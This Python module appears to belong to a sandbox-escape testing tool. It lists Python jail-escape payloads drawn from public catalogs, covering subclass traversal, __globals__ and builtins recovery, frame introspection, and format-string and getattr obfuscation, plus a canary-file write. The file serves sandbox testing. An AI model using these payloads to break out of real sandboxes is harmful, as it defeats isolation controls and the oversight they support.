"""Curated corpus of sandbox escape attempt payloads.

Payloads are sourced directly from public research catalogs:
- moshekaplan/python_sandbox_escapes (https://github.com/moshekaplan/python_sandbox_escapes)
- jailctf/pyjailbreaker (https://github.com/jailctf/pyjailbreaker)

Payloads whose source names a catalog file were checked against the raw
catalog text. Payloads whose source is "standard technique, not verbatim from
a catalog" are well-known techniques written out here; they were not found
verbatim in the catalog files that were reviewed.

Each payload is categorized by its primary escape technique class.
"""

from __future__ import annotations

from typing import Any

from sandbox_escape_finder.dynamic_prober import Payload

# Standard payload catalog dictionaries as requested by specification
PAYLOADS: list[dict[str, str]] = [
    {
        "id": "subclasses_tuple_base",
        "technique": "subclasses_traversal",
        "source": "standard technique, not verbatim from a catalog",
        "code": "().__class__.__bases__[0].__subclasses__()",
        "description": "Traverse object class hierarchy from tuple to list all subclasses.",
    },
    {
        "id": "subclasses_mro_catch_warnings",
        "technique": "subclasses_traversal",
        "source": "standard technique, not verbatim from a catalog",
        "code": "[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__",
        "description": "Extract catch_warnings from subclasses via MRO to access module builtins.",
    },
    {
        "id": "subclasses_int_hierarchy",
        "technique": "subclasses_traversal",
        "source": "standard technique, not verbatim from a catalog",
        "code": "(1).__class__.__base__.__subclasses__()",
        "description": "Traverse base subclasses from int literal instance.",
    },
    {
        "id": "globals_lambda_builtins",
        "technique": "globals_access",
        "source": "standard technique, not verbatim from a catalog",
        "code": "(lambda: None).__globals__['__builtins__']",
        "description": "Access function __globals__ to retrieve unrestricted builtins dictionary.",
    },
    {
        "id": "globals_closure_leak",
        "technique": "globals_access",
        "source": "standard technique, not verbatim from a catalog",
        "code": "(lambda x: (lambda: x))().__closure__[0].cell_contents.__globals__",
        "description": "Inspect function closure cells to extract enclosed function globals.",
    },
    {
        "id": "globals_func_globals_alias",
        "technique": "globals_access",
        "source": "standard technique, not verbatim from a catalog",
        "code": "def f(): pass\nf.func_globals",
        "description": "Attempt Python 2 backward-compatible func_globals attribute access.",
    },
    {
        "id": "builtins_direct_canary_write",
        "technique": "builtins_restoration",
        "source": "standard technique, not verbatim from a catalog",
        "code": "__builtins__['open']('canary_token.txt', 'w').write('PWNED')",
        "description": "Direct access to open() via __builtins__ dictionary to overwrite canary file.",
    },
    {
        "id": "builtins_loader_recovery",
        "technique": "builtins_restoration",
        "source": "standard technique, not verbatim from a catalog",
        "code": "__loader__.__class__.__init__.__globals__['__builtins__']",
        "description": "Recover builtins via __loader__ instance class initialization globals.",
    },
    {
        "id": "frame_generator_inspection",
        "technique": "frame_introspection",
        "source": "standard technique, not verbatim from a catalog",
        "code": "(x for x in ()).gi_frame.f_globals['__builtins__']",
        "description": "Inspect generator execution frame gi_frame to recover module globals.",
    },
    {
        "id": "frame_coroutine_inspection",
        "technique": "frame_introspection",
        "source": "standard technique, not verbatim from a catalog",
        "code": "async def f():\n    pass\nc = f()\nc.cr_frame.f_globals\nc.close()",
        "description": "Create a coroutine object without awaiting it and read its cr_frame.f_globals; close() avoids a 'never awaited' warning.",
    },
    {
        "id": "encoding_format_string_introspection",
        "technique": "format_string_attribute_access",
        "source": "standard technique, not verbatim from a catalog",
        "code": "'{0.__class__.__bases__[0].__subclasses__()}'.format('')",
        "description": "Use str.format attribute accessor syntax to bypass dot attribute scanning.",
    },
    {
        "id": "encoding_getattr_concatenation",
        "technique": "encoding_obfuscation",
        "source": "standard technique, not verbatim from a catalog",
        "code": "getattr(object, '__sub' + 'classes__')()",
        "description": "Concatenate attribute names dynamically within getattr to evade static string matching.",
    },
    # --- Added from verbatim catalog text (fetched from the repos' raw files). ---
    # pyjailbreaker is a gadget library; where a gadget takes parameters
    # (list_classes, str, ...) they are inlined with the library's own other gadgets.
    {
        "id": "builtins_wrap_close_globals",
        "technique": "builtins_restoration",
        "source": "jailctf/pyjailbreaker (jailbreak/gadgets/python/builtins_dict.py::builtins_dict__wrap_close; list_classes inlined from list_classes.py::list_classes__obj_subclass)",
        "code": "[c for c in object.__subclasses__() if 'wrap_close' in str(c)][0].__init__.__globals__['__builtins__']",
        "description": "Find os._wrap_close in the class list and read __builtins__ from its __init__ globals.",
    },
    {
        "id": "builtins_chr_self",
        "technique": "builtins_restoration",
        "source": "jailctf/pyjailbreaker (jailbreak/gadgets/python/builtins_dict.py::builtins_dict__self)",
        "code": "chr.__self__",
        "description": "A builtin function's __self__ is the builtins module; recovers builtins without the string '__builtins__'.",
    },
    {
        "id": "builtins_os_builtins_import",
        "technique": "builtins_restoration",
        "source": "moshekaplan/python_sandbox_escapes (example.py, 'Methods based on searching for import')",
        "code": "os.__builtins__['__import__']('evil_foo')",
        "description": "From a Python-based module (os), read __builtins__ to get __import__ back. Verbatim; 'evil_foo' is the catalog's placeholder module.",
    },
    {
        "id": "frame_gi_frame_f_builtins",
        "technique": "frame_introspection",
        "source": "jailctf/pyjailbreaker (jailbreak/gadgets/python/builtins_dict.py::builtins_dict__gi_builtins)",
        "code": "g = (g.gi_frame.f_back for x in [1])\n[x for x in g][0].f_back.f_back.f_builtins",
        "description": "Walk generator gi_frame then f_back twice up the call stack to reach f_builtins.",
    },
    {
        "id": "format_map_attrerror_leak",
        "technique": "format_string_attribute_access",
        "source": "jailctf/pyjailbreaker (jailbreak/gadgets/python/dict_getitem.py::dict_getitem__attrerror)",
        "code": "d = {'a': 1}\nkey = 'a'\ntry:\n    f\"{{{key}.xx}}\".format_map(d)\nexcept Exception as e:\n    e.obj",
        "description": "Use a format_map field's failing attribute lookup ('.xx') so AttributeError.obj leaks the dict value, with no subscript or getattr call.",
    },
]


def get_payload_corpus(as_objects: bool = False) -> list[dict[str, str]] | list[Payload]:
    """Retrieve the standard payload corpus as dicts or Payload objects.

    Args:
        as_objects: If True, returns instances of Payload dataclass.
            If False (default), returns raw dicts matching {"code", "technique", "source"}.

    Returns:
        List of payload dicts or Payload dataclasses.
    """
    if as_objects:
        return [
            Payload(
                id=p["id"],
                technique=p["technique"],
                source=p["source"],
                code=p["code"],
                description=p.get("description", ""),
            )
            for p in PAYLOADS
        ]
    return [dict(p) for p in PAYLOADS]
